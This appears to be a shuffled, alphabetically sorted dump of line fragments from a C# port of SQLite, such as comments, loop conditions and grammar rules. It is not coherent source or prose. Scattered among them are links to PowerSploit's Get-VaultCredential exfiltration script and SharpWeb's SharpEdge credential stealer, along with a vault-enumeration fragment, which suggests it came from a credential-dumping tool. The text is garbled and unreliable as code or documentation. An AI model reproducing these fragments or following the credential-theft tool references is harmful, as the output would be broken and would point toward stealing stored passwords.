 help it analyze the subexpressions of the WHERE clause.  Each WHERE
 help verify the correct operation of the library.
 here 
 here always fail.  SQLite will not operate with these drivers.  These
 here are place-holders.  Applications can substitute working
 here in order to indicates success or failure.
 here is from the 4th template:
 hexToInt( z[i 
 high-performance timing routines.
 highwater marks.  The first argument is an integer code for
 hint of unplanned behavior.
 historical accident that cannot be fixed without breaking
 hold a write-lock on the schema table (root page 1). This is also
 hold at pVfs.mxPathname characters.
 holding them.
 holds both the TriggerStep object and the TriggerStep.target.z string.
 holds temporary tables and indices.  If TF_Ephemeral is set
 hot-journal back.
 hot-journal rollback following recovery. It may roll back all
 how aiRowEst[] should be initialized.  The numbers generated here
 how long.
 how much of the tree is measured.
 how well the database resists damage due to OS crashes and power
 https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-VaultCredential.ps1
 https://github.com/djhohnstein/SharpWeb/raw/master/Edge/SharpEdge.cs
 hwtime.h contains inline assembler code for implementing
 i != 1 ) 
 i != iSkip )
 i != null 
 i )
 i ) < z.Length 
 i - nPad]
 i : 0 )
 i < 1 
 i < 11 
 i < 16 
 i < 2 
 i < 20 
 i < 255 
 i < 26
 i < 3 
 i < ArraySize( aBuiltinFunc ) 
 i < ArraySize( aCopy ) 
 i < ArraySize( aDateTimeFuncs ) 
 i < ArraySize( aPragma ) 
 i < ArraySize( iLength ) 
 i < ArraySize( meta ) 
 i < BITVEC_NPTR 
 i < Limit 
 i < MAX_PATH 
 i < N 
 i < SQLITE_N_COLCACHE 
 i < YY_SZ_ACTTAB)
 i < aBucket.Length 
 i < aOvfl.Length 
 i < argc 
 i < argc - 1 
 i < columnCount 
 i < db.nDb 
 i < db.nDb )
 i < db.nExtension 
 i < dbFileVers.Length 
 i < iEnd 
 i < iStart 
 i < inStr.Length 
 i < k
 i < k - 1
 i < mx 
 i < n
 i < n 
 i < nBlob 
 i < nCell
 i < nChar 
 i < nCol 
 i < nColumn 
 i < nExpr 
 i < nFarg 
 i < nField 
 i < nIdx 
 i < nIn 
 i < nNew
 i < nOld
 i < nOp 
 i < nOrderBy 
 i < nReg 
 i < nSubSrc 
 i < new_size 
 i < p->nField 
 i < p.db.nDb 
 i < p.nCol 
 i < p.nConstraint 
 i < p.nCursor 
 i < p.nExpr 
 i < p.nHash 
 i < p.nId 
 i < p.nOp 
 i < p.nOrderBy 
 i < p.nSrc 
 i < p.nVar 
 i < p.pSrc.nSrc 
 i < p.zBLOB.Length 
 i < p1 
 i < pA.x.pList.nExpr 
 i < pAggInfo.nAccumulator 
 i < pAggInfo.nColumn 
 i < pAggInfo.nFunc 
 i < pChanges.nExpr 
 i < pColumn.nId 
 i < pDest.nCol 
 i < pEList.nExpr 
 i < pFrom.nVar 
 i < pGroupBy.nExpr 
 i < pIdx.nColumn 
 i < pIndex.nColumn 
 i < pKeyInfo.nField
 i < pList.nExpr 
 i < pList.nId 
 i < pList.nSrc 
 i < pMaskSet.n 
 i < pMem.n 
 i < pNC.pSrcList.nSrc 
 i < pNew.nCol 
 i < pOp.p2 
 i < pOrderBy.nExpr 
 i < pPKey2.nField )
 i < pPage.nCell
 i < pPage.nCell 
 i < pPager.nSavepoint 
 i < pParse.nTableLock 
 i < pParse.nVarExpr 
 i < pProbe.nColumn 
 i < pRec.zBLOB.Length 
 i < pSrc.nColumn 
 i < pSrc.nSrc - 1 
 i < pSrcList.nSrc 
 i < pTab.nCol 
 i < pTabList.nSrc 
 i < pTable.nCol 
 i < pVdbeFunc.nAux 
 i < pVm.nResColumn 
 i < pWInfo.nLevel 
 i < sAggInfo.nColumn 
 i < sAggInfo.nFunc 
 i < sizeof( u32 ) 
 i < sqlite3GlobalConfig.nPage 
 i < this.aColCache.Length 
 i < usableSize
 i < vaultCount
 i < wsdAutoext.nExt 
 i < z.Length 
 i < zArg.Length 
 i < zConverted.Length 
 i < zFmt.Length 
 i < zNum.Length 
 i < zTerm 
 i <= 2 ) 
 i <= nCol 
 i <= p.iPage
 i <= p.nMem 
 i <= pCur.iPage
 i <= pIdx.nColumn 
 i <= pIndex.nColumn 
 i <= pPage.nCell 
 i <= pPager.dbOrigSize 
 i <= sCheck.nPage
 i <= sCheck.nPage 
 i <= sz 
 i <= yypParser.yyidx
 i <N_SORT_BUCKET 
 i = ( aNext[i] ) - 1 )
 i = i 
 i = i.next )
 i == ( pPKey2.nField - 1 ) )
 i == 0 ) return 0
 i == 1 ) continue
 i == pIdx.nColumn
 i == z.Length 
 i == z.Length ) c = 0
 i > 0
 i > 0 
 i > db.aLimit[SQLITE_LIMIT_VARIABLE_NUMBER] )
 i > p.nVar )
 i >= 0
 i >= 0 
 i >= 0 )
 i >= 5 
 i >= YY_SZ_ACTTAB 
 i >= iStart 
 i >= nPad 
 i!=null
 i-- )
 i-- )// pItem
 i--)
 i--){}
 i-th column of table pTab. This routine sets the P4 parameter of the
 i.ToString()).ToString()
 i.e for a sector size of 512:
 i.e. if the parser sees:
 i.e. one of:
 i.e. the WHERE clause expresssions in the following statements all
 i.e. the database has been reorganized so that only the first pnTrunc
 i< sqlite3GlobalConfig.nScratch
 i< sqlite3GlobalConfig.nScratch )
 i< z1.Length 
 i<0x00110000
 i<0xE000 ) continue
 i<20
 i<=0xDFFF ) t = 0xFFFD
 i<=loopLimit
 i<SQLITE_N_COLCACHE
 i<db->nDb
 i<db->nVTrans
 i<db.nDb
 i<n
 i<nArg
 i<nByte
 i<nCol
 i<nOrderBy
 i<nPage
 i<nType
 i<p->nModuleArg
 i<p.nConstraint
 i<p.nOp
 i<pArray->nMutex
 i<pIdxInfo.nConstraint
 i<pOrderBy.nExpr
 i<pParse->nVtabLock
 i<pParse.nVtabLock
 i<pTab.nCol
 i<pToCol.nExpr
 i<pWC.nTerm
 i<sizeof(winMutex_staticMutexes)/sizeof(winMutex_staticMutexes[0])
 i=sqliteHashNext(i)){
 i>0 
 i>0 ){
 i>19 ){
 i>=YY_SZ_ACTTAB 
 iAlias <= pParse.nAlias )
 iAmt )
 iAmt <= p.endpoint.iOffset )
 iArg < 0 )
 iArg >= pVdbeFunc.nAux 
 iB == SMALLEST_INT64 ) iA = 1
 iBreak.
 iCol
 iCol < 32768 )
 iCol < p.pEList.nExpr )
 iCol < pEList.nExpr )
 iCol < pS.pEList.nExpr ) )
 iCol < pTab.nCol
 iCol < pTab.nCol 
 iCol < pTab.nCol )
 iCol < pTab.nCol ) )
 iCol > pEList.nExpr )
 iCol<pTab->nCol
 iCol<pTab.nCol
 iContinue != 0 )
 iCookie != BTREE_FREE_PAGE_COUNT )
 iCount - 1
 iCur 
 iCur is the index of a cursor open on the pTab table and pointing to
 iCurrent > iSize )
 iCursor is not in the set.
 iDb
 iDb ) code = SQLITE_DROP_TEMP_INDEX
 iDb < db.nDb 
 iDb < db.nDb )
 iDb == 1 )
 iDb == 1 ) return 0
 iDb > 1 )
 iDb >= 2 )
 iDb mutex may be temporarily released to avoid deadlock. If
 iDb!=0 ){
 iDb--){
 iDb<db->nDb )
 iDb==1 ) i = SQLITE_CREATE_TEMP_INDEX
 iDb==1 ){
 iDb>=0
 iDepth
 iDivisor
 iEnc
 iFree > nFin 
 iFree--)
 iFreePg > nFin)
 iFrom < pSrc.nSrc )
 iFrom >= 0 
 iFrom] = pSubSrc.a[i]
 iFrom].pUsing )
 iGuess == PENDING_BYTE_PAGE(pBt))
 iHdrOff != pPager.journalHdr )
 iIdx
 iIdx > iLargest )
 iKey > pCache.iMaxKey )
 iLastPg != PENDING_BYTE_PAGE(pBt))
 iLimit <= 0 )
 iLimit == 0 )
 iLimit > 0 )
 iLimit and iOffset are negative.
 iLoop >= 0
 iLoop--) hit[iLoop] = 1
 iMeta == 0)
 iMeta == 1)
 iMoved != 0 )
 iOff 
 iOff < iEnd 
 iOffset 
 iOffset should have been preset to appropriate default values
 iOffset<0 
 iOfst == 0 )
 iOverflow < i)
 iPage < p.iNext )
 iPage == nearby)
 iPageSize ) != 0 
 iPageSize > SQLITE_MAX_PAGE_SIZE 
 iPageSize16 == (u16)iPageSize )
 iParent.  The iParent cursor will never be used.  Subsequent code
 iPrefEnc 
 iPtrPage.
 iPtrmapParent != iParent)
 iReg is a temp register that needs to be freed 
 iRollback != 0 
 iSavepoint. A value of 0 means to operate on the outermost savepoint
 iSectorSize ) != 0
 iSectorSize < 512
 iSectorSize > MAX_SECTOR_SIZE
 iSet 
 iSet >= 0 )
 iSize <= PENDING_BYTE 
 iSize >= PENDING_BYTE 
 iSortOrder == 1 )
 iSrc
 iSrc<pTabList->nSrc
 iStartAddr throught the end of the program.  This is used to see if
 iStatCur.
 iStatement is 1. This anonymous savepoint can be released or rolled back
 iTab < iDestroyed )
 iTable and that last slot formerly occupied by the last root page
 iTrigDb == 1 )
 iVersion 
 iZnum < zNum.Length 
 i] != '/' ) 
 i] != delim )
 i] )
 i] ) 
 i] ) != 0 
 i] ) ) { i
 i] - '0' ) >= 0 
 i] = '0'
 i] = (byte)( ( v 
 i] = (u8)( v 
 i] = buf[bufpt 
 i] = buf[j]
 i] == '.' )
 i] == 'E' ) 
 i] == 'e' 
 id ::= ID 
 id ::= INDEXED 
 id and pId2 is any empty string.
 identifier.  The number returned includes any quotes used
 identity of the database connection (the blocking connection) that
 ids ::= ID
 idx
 idx 
 idx < ArraySize( fmtinfo ) 
 idx < pPage.nCell)
 idx < precision 
 idx <= 15)
 idx > 0 
 idx-- )
 idx>0
 idx]
 idx] )
 idx_affinity is the affinity of an indexed column. Return true
 idxlist 
 idxlist ::= idxlist COMMA nm collate sortorder 
 idxlist ::= nm collate sortorder 
 idxlist_opt 
 idxlist_opt ::= 
 idxlist_opt ::= LP idxlist RP 
 if !SQLITE_OMIT_AUTOVACUUM 
 if ( p.pResultSet[i_pMem] == null ) p.pResultSet[i_pMem] = new Mem()
 if (SQLITE_SMALL_STACK)
 if <table2> and <table1> are distinct tables but have identical
 if FALSE //(__GNUC__ > 3 
 if SQLITE_ENABLE_OVERSIZE_CELL_CHECK is defined
 if SQLITE_OMIT_DECLTYPE
 if SQLITE_OMIT_LOAD_EXTENSION is defined: 
 if SQLITE_OS_OTHER==1
 if SQLITE_THREADSAFE 
 if TRUE then do not journal this file 
 if a [database connection] is being used at the same time in a separate
 if a root-page of another table is moved by the btree-layer whilst
 if additional input is needed before sending the text into
 if any column is not found.
 if any of the following is true:
 if both values are integers.
 if defined SQLITE_OMIT_AUTOVACUUM 
 if defined(HAVE_STDINT_H)
 if defined(SQLITE_HAVE_ISNAN) 
 if either column has NUMERIC or INTEGER affinity. If neither
 if errors is returned.
 if fsync()s are executed normally.
 if initialising a database schema.
 if it controls a LEFT OUTER JOIN and it did not originate in the ON
 if it exists.
 if it find an index at all. 
 if it is a constant.  Set 
 if it is already defined or if it is unneeded because we are
 if it is false.
 if it is open and the pager is not in exclusive mode.
 if it knows that this is enforced elsewhere.
 if it returns success 
 if necessary and generates an error message if the collating sequence
 if negFlag is true.
 if not _MSC_VER 
 if not found.
 if pListItem->pExpr is not null then either pListItem->pExpr->pColl
 if such a lock exists and false otherwise.
 if the P4 argument is a P4_MEM use the value of the P4 argument as
 if the VDBE has just been set to run but has not actually executed any
 if the child journal contains a reference to master journal
 if the current N values are new.
 if the database is (in theory) writable.
 if the database supports auto-vacuum or not. Because it is used
 if the file system has to be queried for the size of the file and
 if the floating point value is out of range. (See ticket 
 if the index with affinity idx_affinity may be used to implement
 if the main transaction commits or rolls back.
 if the new size is the same as the prior size.
 if the page is overfull. This routine ensures that all cells allocated
 if the pointer can possibly be shared with
 if the statement cannot be recompiled because another connection has
 if there are any active statements at all.
 if there are fewer than NN siblings on the other side. If pParent
 if there has been no previous output.  If regPrev>0 then code is
 if there is a difference.
 if there is no match.
 if there is one.  If there is no ORDER BY clause or if this routine
 if there were schema changes during the transaction or if a
 if they are identical and return FALSE if they differ in any way.
 if they are not used.
 if this is the first reference to the page.
 if this is the first term of the FROM clause.  pTable and pDatabase
 if those bytes were zeroed in buf[].
 if two files are created in the same file-system directory (i.e.
 if we have a special test build.
 if we run out of memory.
 if( pParse.nErr ) goto update_cleanup
 if( pSrcList==0 ) break
 if( precision>=0 
 ifdef HAVE_INT16_T
 ifdef HAVE_INT8_T
 ifdef HAVE_u3216_T
 ifdef HAVE_u328_T
 ifdef HAVE_u32_T
 ifdef SQLITE_OMIT_DECLTYPE
 ifexists ::= 
 ifexists ::= IF EXISTS 
 ifndef SQLITE_OMIT_AUTOVACUUM 
 ifndef SQLITE_OMIT_SHARED_CACHE 
 ifndef SQLITE_OS_WIN
 ifnotexists ::= 
 ifnotexists ::= IF NOT EXISTS 
 ii )
 ii ) )
 ii < db.nDb 
 ii < nChar 
 ii < nField 
 ii < nJRec 
 ii < nPage 
 ii < nPage ) 
 ii < nSavepoint 
 ii < p.pOrderBy.nExpr 
 ii < pCur.iPage
 ii < pOrWc.nTerm 
 ii < pPager.nSavepoint 
 ii < pPager.nSubRec 
 ii<=SQLITE_MAX_DEFAULT_PAGE_SIZE
 ii<=p.nMem
 ii=ii
 ii]
 image.  
 immediately call the destructor for any non-static values.
 immediately following the OP_Return at the bottom of the loop. This
 immediately following the last journal record written into the main
 immediately prior to the OP_Compare.
 immediately.
 immediately.  There will be no error message but the p.rc field is
 implement SQL functions and aggregates.  See
 implement it.  Allocate that sorting index now.  If it turns out
 implement sqlite3ExprAnalyzeAggregates().  See sqlite3ExprAnalyzeAggregates
 implement that clause.  If the ExprList is the result set of a SELECT
 implement the SQL functions.
 implement the programmer interface to the library.  Routines in
 implementation below). This is used to ensure that a page is only
 implementation described by pWInfo.
 implementation for specialized deployments or systems for which SQLite
 implementation is included with the library. In this case the
 implementation of Get-VaultCredential
 implementation of [application-defined SQL functions] are protected.
 implementation of an SQL aggregate step callback may not use the
 implementation of an application-defined [sqlite3_os_init()].
 implementation of sqlite3_os_init() or sqlite3_os_end()
 implementation of these routines to be omitted.  That capability
 implementation of this method is expected to release all outstanding
 implementation should use the pNext pointer.
 implementation. The xShutdown() method is called from within 
 implementation. sqlite3_vtab
 implementations are available in the SQLite core:
 implementations for sqlite3_os_init() and sqlite3_os_end()
 implementations should keep their own counts within their aggregate
 implemented on some systems.  So we avoid defining it at all
 implements the DROP INDEX statement.
 important because the OpenWrite opcode below will be needing it. 
 important that a RESERVED lock is not obtained on the way to the
 imposed by the necessity of storing the value in a 2-byte unsigned integer
 improvement performance through careful use of indices.</dd>
 in 
 in 'direct' mode. In this case the journal file will never be
 in NULL pointers.  All other values are in their UTF-8 zero-terminated
 in P1 is NULL then take the jump if P3 is true.
 in P1 is not an integer and cannot be converted into an integer
 in Pager.dbFileVers[] is updated to match the new value stored in
 in PostgreSQL.
 in a CREATE TABLE statement.  sqlite3StartTable() gets called
 in a Mem struct is returned by the MemType(Mem
 in a [prepared statement].  SQL parameters are tokens of the
 in a balancing operation.  NN is the number of neighbors on either side
 in a production build.
 in a thread-safe way.  The [sqlite3_vfs_find()] interface
 in addition to using an authorizer.
 in an argument to the module name in a CREATE VIRTUAL TABLE statement.
 in an array names azResult.  Then azResult holds this content:
 in an error.
 in an index.  The details of the format are irrelevant as long as
 in an ordinary build.
 in apCell[] of the cell that divides page i from page i
 in ascending order.
 in backup.c maintains the content of this variable. This module
 in between minLocal and maxLocal.
 in between the times when 
 in bytes.  Since a single thread may only have one scratch allocation
 in cache.  If the page previously located at pgno is not already
 in case a root-page belonging to another table is moved by the btree layer
 in case the master journal file name was written into the journal
 in consecutive registers and the index of the first register is returned.
 in database %s 
 in exchange for a larger degradation in INSERT and UPDATE performance.
 in fact there is none.  This results in a false-positive which will
 in its place.  So will fill this column with a NULL to avoid
 in one of the following ways:
 in order to avoid running the <test if data structure contains null>
 in order to be certain that we got the right one.
 in order to complete the WHERE clause processing.
 in order to complete the process of building the trigger.
 in order to generate code for DELETE FROM statements.
 in order to keep track of some global state information.
 in order to preserve backwards compatibility.
 in order without every having to backup and retry and without
 in other words if the SELECT pulls all columns from a single table
 in p.rc.  This routine sets that result back to SQLITE_OK.
 in pEList is of the format <id>=<expr>.  If any of the entries
 in pPage.aOvfl[] and make it point to the cell content (either
 in pParse and return WRC_Abort.  Return WRC_Prune on success.
 in pParse->zArg[] and appends it to the list of arguments on the
 in pTabList pointing at their appropriate entries.  The [...] code
 in pTemp or the original pCell) and also record its index.
 in pValue.  If the expression is not an integer or if it is too big
 in register P1 is passed as the zName argument to the xRename method.
 in register target.
 in some cases when it is copied into the stack after the following
 in sorted order
 in sqlite.aDb[].  0 is for the main database and 1 is for the file that
 in terms of the following bit values:
 in that it omits the checksums and the header.
 in the 4th parameter to the xOpen method of the
 in the AggInfo structure.
 in the CREATE TRIGGER statement.
 in the OLD.
 in the ON clause.  The term is disabled in (3) because it is not part
 in the SQLITE_MASTER table of the database.
 in the USING clause.  Example: If the two tables to be joined are
 in the VDBE that record the limit and offset counters.
 in the [database connection] (to be retrieved using sqlite3_errmsg()).
 in the argument belongs.  This is the same database handle that was
 in the common case where no overflow pages are used.
 in the current table point to the foreign key.  If pFromCol==0 then
 in the database file is moved into the slot formerly occupied by
 in the first argument.
 in the first argument.  If no successful [INSERT]s
 in the following cases:
 in the following text:
 in the following:
 in the index.  There is one additional integer in the list for each
 in the input grammar file. 
 in the list are moved to the sqlite3.pDisconnect list of the associated 
 in the list by making it the first character after '[' or '
 in the main journal either because the page is not in cache or else
 in the most recent OP_Compare instruction the P1 vector was less than
 in the native byte-order of the host machine.  The
 in the original SQL statement.
 in the original table definition.
 in the outer query.
 in the output buffer.
 in the page header at offset 7.
 in the page if the page is not already in cache.  This routine
 in the referenced BtShared that point back to this Btree since those
 in the resolution is a copy of the I-th result-set expression.  If
 in the result of the inner select.  We have no way to estimate
 in the result set and expand them one by one.
 in the result set of a [SELECT] statement.  The sqlite3_column_name()
 in the result set.
 in the result set.  Return an 1-based index of the matching
 in the result set.  This information is used to provide the
 in the right order to begin with.
 in the sequence.  Use this information to construct a string
 in the serialized [threading mode] unless single-thread was
 in the source file sqliteVdbe.c are allowed to see the insides
 in the sqlite.aDb[] array.  aDb[0] is the main database file and
 in the sqlite3.aVTrans array.
 in the sqlite3_version[] string constant.  The function is provided
 in the sqlite_master table.
 in the table.
 in the temporary database.
 in the unread portions of the buffer with zeros.  A VFS that
 in the values of the last digit if the only difference is in the
 in the virtual machine.  
 in their result sets.
 in this case.
 in this case.  But for things like temporary table (which will be
 in turn helps the operating system to deliver pages
 in which case this routine will be called recursively.
 in zType.
 in-memory database structures.
 in-memory pages in the list to the database file. The argument may
 in1 
 in1:   P1 is an input 
 in2 
 in2:   P2 is an input 
 in3 
 in3:   P3 is an input 
 inMultiplier
 inMultiplier 
 inProgress 
 inStr[i] != '-' ) break
 in_op ::= IN 
 in_op ::= NOT IN 
 include <ctype.h>
 include <math.h>
 include <os2.h>
 include <sys/cygwin.h>
 include <tcl.h>
 include <uconv.h>
 include <windows.h>
 include [SQLITE_OPEN_READONLY].  Other bits in 
 include a check in their application to verify that
 include this one indirectly.
 included in the VFS structure for completeness.
 including calls from other threads against the same cache.
 including the temp database. (b) is important because if more than
 inclusive.  Return a pointer to the new object.  Return NULL if
 incompatible journal file format.
 incompatible with an SQLite library compiled with a different limit. If
 incr-vacuum flags. This is required in case this connection
 incrVacuumStep() will be called a finite amount of times
 increment entry count 
 incremental BLOB I/O] can be performed.
 incremental BLOB I/O] routines.
 incremental blob I/O routines can only read or overwriting existing
 incremented (otherwise not).
 increments the iAbortFlag memory location before returning in
 indefinitely for an unlock-notify callback that will never
 independent tokens (they are part of the token in which they are
 index and making sure that duplicate entries do not already exist.
 index could potentially invoke a REPLACE conflict resolution
 index cursors 
 index do not need to satisfy this constraint.)  The pbRev value is
 index entries associated with a single row of a single table.
 index for the key.  No index is created for INTEGER PRIMARY KEYs.
 index iParentIdx. This scenario comes about when this function
 index is out of range.  [SQLITE_NOMEM] is returned if malloc() fails.
 index might end up being unused if the data can be
 index name is '
 index of the database this pragma is being applied to in db.aDb[]. 
 index opened by cursor P1.
 index or table name in the same database.  Issue an error message if
 index or table with the same name.
 index to implement a DISTINCT test.
 index value returned is suitable for use as the second
 index with the current table contents.
 index.
 index.  The first integer in the list is the total number of entries
 index.  The values for all constraints are left on the stack.
 indexable != 0 
 indexed column for writing.
 indexed_opt ::= 
 indexed_opt ::= INDEXED BY nm 
 indexed_opt ::= NOT INDEXED 
 indicate success or failure.
 indicates a corrupt database files:
 indicates that subsequent malloc failures are non-benign.
 indicating no affinity for the expression.
 indicating that a memory allocation failed.
 indicating that a string or BLOB is to long to represent.
 indicating whether the function prefers UTF-16 over UTF-8.  Return a
 indices associated with the named table.
 indices that the user might have created.
 indices to be created and the table record must come before the
 indices use the collating sequence pColl.  If pColl == null then recompute
 indices where aRegIdx[i]==0.  The order of indices in aRegIdx[] is
 indices. 
 individual bits within V.
 individual columns using the OP_Column opcode.
 individual selects always group from left to right.
 individual tables within the shared-cache cannot be obtained. See
 individual threads.
 individual tokens and sends those tokens one-by-one over to the
 infop.prefix != 0 )
 information about each column of an SQL table is held in an instance
 information about the conflict resolution algorithms specified
 information about the format of the data.)  Extract the P2-th column
 information about the page that is decoded from the raw file page.
 information for the i-th table in the FROM clause before reordering.
 information in case inserts are down within triggers.  Triggers do not
 information is written to disk in the same order as calls
 information need not be flushed. If the lower four bits of the flag
 information such as the size of key and data.
 information to the Table ure that represents the result set
 information.
 initSize
 init_deferred_pred_opt ::= 
 init_deferred_pred_opt ::= INITIALLY DEFERRED 
 init_deferred_pred_opt ::= INITIALLY IMMEDIATE 
 initialised. zMasterName is the name of the master table.
 initialization of the SQLite library.  The sqlite3_os_end()
 initialization process would never complete.
 initialization.
 initialize a memory cell that records if this table matches any
 initialize those fields.
 initialized when [sqlite3_open()] is called if it has not be initialized
 initializer must be kept in sync with the SQLITE_LIMIT_
 inner   
 input number to be zero-terminated.
 input page number.
 inputs to xBestIndex and are read-only.  xBestIndex inserts its
 inscollist 
 inscollist ::= inscollist COMMA nm 
 inscollist ::= nm 
 inscollist_opt 
 inscollist_opt ::= 
 inscollist_opt ::= LP inscollist RP 
 insert a No-op and add the comment to that new instruction.  This
 insert a divider cell into the parent page.
 insert is likely to be an append.
 insert pNew into the pEntry hash bucket.
 insert routine needs to know about.
 insert statement.  Inserts on views do not affect its value.  Each
 insert the names
 insert_cmd ::= INSERT orconf 
 insert_cmd ::= REPLACE 
 inserted as part of some other set).
 inserted into is a view
 inserted into or removed from the parent page (pParent). Doing so
 inserted or deleted using this database connection.
 inside the C code.
 install a mutex implementation via sqlite3_config() prior to
 install a new function.  Whatever FuncDef structure is returned will
 instance of the [sqlite3_mem_methods] structure.  The [sqlite3_mem_methods]
 instance of the [sqlite3_mem_methods] structure.  The argument specifies
 instance of the [sqlite3_mutex_methods] structure.  The
 instance of the [sqlite3_mutex_methods] structure.  The argument specifies
 instance of the following structure.
 instance of the sqlite3_pcache_methods structure. The majority of the 
 instance of the sqlite3_vtab
 instance of this structure and passing a pointer to that instance
 instance of this structure is the first argument to the routines used
 instance passed as the first argument. This is the value configured using
 instead of
 instead of actually concluded. A subsequent call to CommitPhaseTwo()
 instead of deserializing a value from the record.
 instead of plain old C.
 instead of the trigger name.
 instruction.
 instructions that might cause a statement rollback.  Such instructions
 instructions.
 insure that all entries in the union of DEST and SRC will be
 int D = 0
 int M = 0
 int int 
 int j
 int m = 0
 int n
 int nMn = 0
 int newSize
 int pPayloadIndex = 0
 int pPriorIndex = 0
 int pSrcIndex = 0
 int rc
 int s = 0
 integer conversions. 
 integer etc.) of the same value.  A value (and therefore Mem structure)
 integer in P3 into the RowSet and continue on to the
 integer is two or more bytes.  But overall it is faster.
 integer key called the [ROWID 
 integer key to use. It then calls this function to actually insert the
 integer opcode.  The third argument is a generic pointer intended to
 integer or a floating-point number.)
 integer pHasMoved is set to one if the cursor has moved and 0 if not.
 integer value pointed to by pnChange is incremented by the number of
 integer. 
 integer. The following block moves pIter to point at the first byte
 integrity_check designed to detect most database corruption
 intend to use is supported by the library.  Extensions should
 intended for use inside Debug.Assert() statements.
 intended for use only inside Debug.Assert() statements.
 interface [sqlite3_prepare()] and [sqlite3_prepare16()].  The use of the
 interface call returns.
 interface is called automatically by sqlite3_initialize() and
 interface is only available if SQLITE_CHECK_PAGES is defined when the
 interface is the same except that it always returns the 
 interface is to keep a GUI updated during a large query.
 interface layer.  Individual OS interface implementations will
 interface returns a pointer to a zero-terminated UTF-8 string
 interface routine of sqlite3_exec().
 interface routines.  These are just wrappers around the main
 interface shall be invoked once for each call to [sqlite3_shutdown()].
 interface should also return 1 when given a NULL pointer.
 interface to further control untrusted SQL.  The size of the database
 interface will continue to be supported.
 interface.
 interfaces
 interfaces always report the most recent result.  To avoid
 interfaces as either deprecated or experimental.  New applications
 interfaces or
 interfaces require protected sqlite3_value objects.
 interfaces to the end of this structure only.  If you insert new
 interfaces.
 interfaces.  However the values returned in 
 intermediate results while calculating an aggregate.  This
 intermediate results.
 internal count when using count(
 internal equivalents).  Only the value returned in the
 internal function sqlite3Error() is used to set these variables
 internally and without recourse to the [sqlite3_vfs] xRandomness
 internally by sqlite3NestedParse.  
 interprets the string from sqlite3_result_error16() as UTF-16 in native
 interrupt].
 interrupted.  This feature can be used to implement a
 intkey B-Tree to store the set of IN(...) values instead of the usual
 into a new empty database by initializing the first page of
 into a numeric representation.  Use either INTEGER or REAL whichever
 into a register and convert the expression into a TK_REGISTER
 into a register.  Return the register number where the results
 into an OP_Noop.
 into an OP_String before it is executed for the first time.
 into an integer that the pArg argument points to. This capability
 into cookie number P2 of database P1.  P2==1 is the schema version.
 into its constituent fields.
 into pRC.
 into space obtained from aSpace1[] and remove the the divider Cells
 into the [xCreate] and [xConnect] methods of the virtual table module
 into the array in the first place. 
 into the database handle. This block copies the error message
 into the index P1.  Data for the entry is nil.
 into the library.
 into the linked list headed by pTab->pVTable. Then loop through the 
 into the local apCell[] array.  Make copies of the divider cells
 into the output.  In addition to the two coroutines (called selectA and
 into the pMem element.
 into the record header cache fields of the cursor.
 into the second half to give some continuity.
 into the sqlite_master table.)
 into the target register. This will be the result of the
 into u.iValue and the EP_IntValue flag is set.  No extra storage
 invalidate any incrblob cursors open on the row being deleted.  
 invalidated.
 invalided by this operation.  Any attempt to use a cursor
 invert ) == 0 )
 invocation SQLITE_NOMEM is returned instead.
 invocation of [sqlite3_malloc()] or [sqlite3_realloc()] that have
 invocation of this opcode.
 invocation. The value in register (P3
 invocations of the same function so that the original pattern string
 invocations.
 invocations.  The sqlite3_index_info structure is also used when
 invoke sqlite3_create_function() or sqlite3_create_function16() multiple
 invoke the busy handler - just return SQLITE_BUSY.  SQLITE_BUSY is
 invoke the busy handler when upgrading from
 invoke the callback function.
 invoke the destructor function (if it is not NULL) when SQLite
 invoke the result callback (if there is one) or return with
 invoked at the conclusion of each write-transaction.
 invoked when rows are deleted using the [truncate optimization].
 invoked.
 invokes the collation factory if the named collation cannot be found
 involved are nearly as big or bigger than SQLite itself.
 involves writing the index into the master table and filling in the
 irrevocably committed.
 is 
 is (X-1).   An expression from the ON clause of a LEFT JOIN can use
 is (x - 0x20). Therefore toupper() can be implemented as:
 is 0.
 is 2
 is NO_LOCK.  If the second argument is SHARED_LOCK then this routine
 is UTF-16le or UTF-16be do a translation.
 is UTF-8 encoded.
 is Win95 or WinNT.
 is a 0x00.
 is a NULL pointer then its behavior is identical to calling
 is a SELECT statement.
 is a closer match than a function where the encoding difference is
 is a commuted copy of a prior term.)  The original term has nChild=1
 is a copy of the 3rd argument to this routine.  The second argument
 is a correlated subquery) then the value of the allocated register is
 is a limit/offset term to enforce.
 is a min() or max() query. Return WHERE_ORDERBY_MIN or WHERE_ORDERBY_MAX if
 is a no-op returning WRC_Continue.
 is a no-op.
 is a no-op. The value returned is the error state error code (i.e.
 is a null-terminated string.  Operand P5 is an unsigned character.
 is a primary key or unique-constraint on the most recent column added
 is a root page or a child of a root page) then all available siblings
 is a special table that holds the names and attributes of all
 is a string composed of a list of integer statistics about the
 is a very low but non-zero probability of damage.  Level 3 reduces the
 is accessed.
 is added to the dequoted string.
 is advantageous to leave the cursor pointing to the last entry in
 is allocated to hold the integer text and the dequote flag is ignored.
 is allocated.  
 is already in a read-transaction and a read-transaction
 is already journaled.
 is also added (this can happen with an auto-vacuum database).
 is also passed as a parameter to both  methods. If the output buffer
 is always aligned to at least an 8 byte boundary. {END}
 is always associated with the Pager object passed as the first
 is always at least as big as the requested size but may be larger.
 is always first parameter to [application-defined SQL functions].
 is an ORDER BY clause.
 is an array of integers that defines the test.  Return -1 on a
 is an instance of this class.
 is an integer code for a specific [SQLITE_STMTSTATUS_SORT 
 is an optional callback that is invoked once for each row of any query
 is an upper bound on the total memory allocation for all threads. In
 is another alias for the rowid.
 is appears in the original table.  (The index of the primary
 is appropriate.  But only do the conversion if it is possible without
 is as follows:
 is assigned when the database is connected using [ATTACH].
 is being called from within pager_playback(). The local value
 is being used to write to the source database when sqlite3_backup_step()
 is benign (since failing to resize a hash table is a performance
 is called (indirectly) from sqlite3BtreeDelete().
 is called to complete the construction of the new table record.
 is called to test how well the function passed as the first argument
 is called.  If iColumn<0 then code is generated that extracts the rowid.
 is capable of writing to the databse.  That means the cursor was
 is case sensitive causing 'a' LIKE 'A' to be false 
 is checked.  This process continues until either a match is found
 is closed by the DETACH.
 is closed or might close before sqlite3_interrupt() returns.
 is collected about the
 is commited for an auto-vacuum database.
 is committed.
 is completely recoverable simply by not carrying out the resize. The
 is considered a column can be complex in the presence of subqueries. The
 is considered a variable but a single-quoted string (ex: 'abc') is
 is considered to be pinned.
 is considered true if it has a numeric value of zero.  If the value
 is considered true if it is numeric and non-zero.  If the value
 is constant but the second part is reset at the beginning and end of
 is converted into:
